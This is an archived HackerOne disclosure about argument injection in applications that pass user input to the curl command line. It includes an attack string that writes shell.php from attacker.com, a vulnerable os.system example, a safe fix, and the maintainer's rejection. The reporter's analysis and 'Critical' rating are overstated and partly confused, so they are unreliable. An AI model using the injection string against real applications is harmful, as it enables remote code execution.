---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
substate: "not-applicable"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2026-04-13
submitted: 2026-04-13T05:18:05.407Z
bounty_usd: null
votes: 23
cve: []
program: "[[programs/curl|curl]]"
reporter: "midoussa7"
source: "https://hackerone.com/reports/3669305"
title: "Argument Injection via curl Short-Flag Grouping"
---
# Argument Injection via curl Short-Flag Grouping

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 23 | **Program:** curl | **Disclosed:** 2026-04-13

- Report: [https://hackerone.com/reports/3669305](https://hackerone.com/reports/3669305)
- CWE: Command Injection - Generic
- Submitted: 2026-04-13T05:18:05.407Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

This report details how the curl -os command facilitates an Argument Injection vulnerability in applications that wrap the curl command-line tool.
The specific command curl -os /etc/passwd --url http://example.com demonstrates a subtle but dangerous behavior. Because -s (silent) follows -o (output), curl expects the very next string to be the filename.In this scenario:The -o flag consumes the next argument (/etc/passwd).The -s flag tells curl to suppress the progress meter and error messages.The --url flag specifies the source of the data.This effectively turns a "downloader" into a "file overwriter."
 Root Cause Analysis
The root cause is insufficient input validation and the unsafe use of command-line wrappers.Flag Grouping: Like most Unix-style utilities, curl allows "short-flag grouping." When a user inputs -os, curl interprets this as two separate flags: -o (output to a file) and -s (silent mode).Missing Delimiters: If an application executes a command like curl $USER_INPUT, it assumes the input will be a URL. However, if the input starts with a dash (-), curl treats it as a command-line argument rather than a string.Shell Interpretation: Many developers use functions like os.system() or exec() which pass a raw string to the system shell, allowing the shell to parse the attacker's injected flags as if they were part of the original command structure.
4. Proof of Concept (PoC)Scenario:
 A web application allows a user to "check if a URL is alive" by running a backend command: curl [USER_URL].

5.Steps to Reproduce:

Attacker Input: 
1-Instead of a URL,
 the attacker enters: -os /var/www/html/shell.php --url http://attacker.com 
2- Backend Execution:
 The server executes the concatenated string:curl -os /var/www/html/shell.php --url http://attacker.com Result: curl silently downloads the malicious_script.txt and saves it as shell.php in the web 
3-rootExploitation: 
The attacker navigates to http://victim.com to execute their code.

## Impact

## Summary:
The impact of this vulnerability is typically categorized as High to Critical, depending on the environment:Arbitrary File Write: An attacker can use the -o (or --output) flag to write the contents of a URL to any location the application has permission to access.System Defacement/DDoS: By overwriting .html or .js files, an attacker can deface a website.Remote Code Execution (RCE): By overwriting a .sh script, a crontab, or a .php file in a web directory, an attacker can execute arbitrary code on the server.Data Exfiltration: Using the -F (form) or -d (data) flags, an attacker could redirect sensitive local files to their own remote server
5. Remediation 
RecommendationsPrimary Fix: Use a library (e.g., libcurl for C, requests for Python) instead of calling the system's curl binary.Argument Separation: If the CLI must be used, use the -- separator to tell curl that all following strings are URLs and not flags:Safe: curl -- [USER_INPUT]Sanitization: Disallow any input that begins with a hyphen (-) or contains shell metacharacters (;, &, |).Would you like a Python or Node.js code example showing the "safe" vs. "unsafe" way to handle these commands?

## Timeline

- **Report Filed**
- **Report Vulnerability Information Updated**
- **2026-04-13** @midoussa7: ❌ The Unsafe Way (Vulnerable)Using os.system() or shell=True allows the shell to interpret spaces and dashes in the user input as new command flags.pythonimport os

# User input intended to be a URL
# Attacker input: "-os malicious.php http://attacker.com"
user_url = input("Enter URL to fetch: ")

# VULNERABLE: The shell parses the entire string
# Resulting command: curl -os malicious.php http://attacker.com
os.system(f"curl {user_url}") 
✅ The Safe Way (Recommended)Using subprocess.run() with a list of arguments and shell=False (the default) ensures that the user input is treated as a single literal string, not as executable 
```javascript
flags.pythonimport subprocess

user_url = input("Enter URL to fetch: ")
```
# SAFE: 'user_url' is treated strictly as an argument for the URL parameter.
# If the user enters "-os malicious.php", curl will simply try to 
# find a website named "-os malicious.php" and fail.
try:
```javascript
    subprocess.run(["curl", "--", user_url], check=True)
except subprocess.CalledProcessError as e:
    print(f"Error fetching URL: {e}")
```
Use code with caution.Key Differences:List vs. String: By passing a list ["curl", user_url], you tell the operating system exactly which part is the program and which part is the data.The -- Separator: Adding -- before the user input tells curl to stop looking for flags entirely. Anything after -- is treated as a URL, even if it starts with a dash.No Shell: Setting shell=False prevents the system from using /bin/sh to parse the command, which neutralizes common injection characters like ;, &, and |.
- **2026-04-13** @bagder: If someone can inject something into the command line, then surely they can insert something there without relying on this?
- **2026-04-13** @bagder: This seems to describe a possibly vulnerable application that *uses* curl, not a vulnerability in curl.
- **2026-04-13** @midoussa7: hi @bagder You are exactly right. This is not a vulnerability in curl itself; it is a Command/Argument Injection vulnerability in the application that uses curl.In security terms, curl is working exactly as designed. The "vulnerability" exists in the glue code written by the developer.Why this is an Application Vulnerability:Trusting User Input: the application takes a string from a user and assumes it is a URL without checking if it starts with a dash (-).Improper Invocation: The application uses a "shell-aware" function (like system() or exec()) to run curl, which allows the attacker to inject new flags.Lack of Encapsulation: The developer failed to use the -- separator, which is the standard way to tell a command-line tool, "Stop looking for flags now; everything after this is just data."The "Tool vs. Implementation" DistinctionThe Tool (curl): Provides a -o flag to save files. This is a core feature.The Implementation: A web app that lets a user control the flags passed to that tool. This is a security flaw.
- **Report Not Applicable**
- **2026-04-13** @midoussa7: You are absolutely correct. To be clear: This is not a vulnerability in the curl tool itself.curl is a command-line utility designed to follow the flags a user provides. If a user (or an attacker) tells it to -o (output) to a file, curl is simply performing its intended function.The security report I drafted was intended to describe a vulnerability in an application that wraps curl, but I agree that the distinction is critical.
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
